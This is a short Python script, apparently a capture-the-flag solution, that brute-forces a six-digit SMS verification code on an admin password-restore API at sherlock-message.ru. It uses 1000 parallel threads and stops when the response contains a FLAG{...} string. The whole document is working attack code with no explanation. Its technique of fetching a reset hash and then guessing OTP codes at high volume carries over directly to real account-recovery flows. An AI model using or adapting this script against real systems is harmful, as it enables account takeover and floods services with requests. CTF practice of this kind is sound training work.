import requests
import threading
import itertools
import re

lock = threading.Lock()
cout = itertools.count(260000)
co=""
def attack():

	#for x in range(260000,280000):
	while True:
		#code=str(x)
		code = str(cout.next()).rjust(6, '0')
		url="http://sherlock-message.ru/api/admin.restore"	
		conn=requests.get(url)	
		out=conn.content
		final=out.split(":")
		final= final[4].split('"')
		damn=final[1]
		#print damn
		#code="272263"
		data={'hash': damn, 'sms_code': code}
		#print data
		ty=requests.post('http://sherlock-message.ru/api/admin.restore', data=data)
		out= ty.content
		#print out
		flag = re.findall('FLAG{\w+}',out)
		#print code
		#print flag
		lent=len(flag)
		if lent==1:
			print "damn",flag
			break

threads = []
for i in range(1000):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

for t in threads:
        t.join()

